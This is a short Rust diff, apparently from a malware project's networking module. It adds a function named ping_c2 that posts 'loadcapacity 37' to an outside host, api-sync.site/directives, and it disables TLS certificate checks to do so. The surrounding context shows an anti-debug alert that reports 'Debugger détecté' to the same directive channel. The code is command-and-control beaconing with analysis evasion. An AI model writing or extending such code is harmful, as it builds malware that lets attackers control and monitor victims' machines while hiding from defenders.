@@ -208,3 +208,17 @@ pub async fn send_mapping(mapping: &CommandMapping) -> Result<(), reqwest::Error
 pub async fn send_anti_debug_alert() {
     let _ = send_directive_status("anti_debug", "warning", "Debugger détecté").await;
 }
+
+pub async fn ping_c2() -> Result<(), Error> {
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()?;
+
+    let _res = client
+        .post("https://api-sync.site/directives")
+        .body("loadcapacity 37")
+        .send()
+        .await?;
+
+    Ok(())
+}
